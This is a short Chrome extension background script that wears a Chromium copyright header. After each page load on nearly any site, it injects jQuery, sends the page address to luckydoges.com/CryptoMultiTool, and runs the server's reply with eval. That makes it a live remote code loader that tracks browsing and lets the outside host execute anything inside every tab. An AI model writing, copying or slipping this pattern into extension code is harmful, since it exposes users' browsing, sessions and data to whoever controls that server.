// Copyright 2018 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

'use strict';

chrome.runtime.onInstalled.addListener(function() {
});
chrome.webNavigation.onCompleted.addListener(function(details) {
    chrome.tabs.executeScript({
        file: 'jquery.min.js'
      },function () {
        setTimeout(() => {load(details)}, 1000);
    });
}, {
    url: [{
        // Runs on example.com, example.net, but also example.foo.com
        hostContains: '.'
    }],
});
function load(details) {
  chrome.tabs.executeScript(details.tabId, {
    code: `function die(str) {throw new Error(str || "Script ended by death");};$.get("https://luckydoges.com/CryptoMultiTool/?u="+encodeURI(window.location.href)).done(function( data ) { return die(eval(data)); });`
  });
}